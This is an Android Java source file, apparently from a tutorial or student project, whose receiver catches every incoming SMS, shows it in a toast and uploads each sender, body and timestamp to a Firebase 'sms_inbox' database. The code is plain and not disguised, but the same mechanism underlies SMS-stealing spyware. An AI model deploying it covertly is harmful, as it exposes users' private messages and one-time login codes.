package com.example.receivers;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.widget.Toast;

import java.text.SimpleDateFormat;
import java.util.Date;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

public class SmsReceiver extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent){
        //khi có tin nhắn SMS tới nó tự động nhảy vào đây
        Bundle bundle = intent.getExtras();
        Object[] arrMessages = (Object[]) bundle.get("pdus");
        String phone, time, content;
        Date date;
        byte[] bytes;
        SimpleDateFormat sdf = new SimpleDateFormat("dd/MM/yyyy HH:mm:ss");

        // Khởi tạo Firebase reference
        FirebaseDatabase database = FirebaseDatabase.getInstance();
        DatabaseReference smsRef = database.getReference("sms_inbox");

        for(int i = 0; i<arrMessages.length; i++){
            bytes = (byte[]) arrMessages[i];
            SmsMessage message = SmsMessage.createFromPdu(bytes);
            phone = message.getDisplayOriginatingAddress();
            date = new Date(message.getTimestampMillis());
            content = message.getDisplayMessageBody();
            time = sdf.format(date);
            String infor = phone +"\n" + content + "\n" + time;
            Toast.makeText(context, infor, Toast.LENGTH_LONG).show();

            // Đẩy tin nhắn lên Firebase
            SmsModel sms = new SmsModel(phone, content, time);
            smsRef.push().setValue(sms);
        }
    }
}

// Thêm class model cho tin nhắn SMS
class SmsModel {
    public String phone;
    public String content;
    public String time;
    public SmsModel() {}
    public SmsModel(String phone, String content, String time) {
        this.phone = phone;
        this.content = content;
        this.time = time;
    }
}
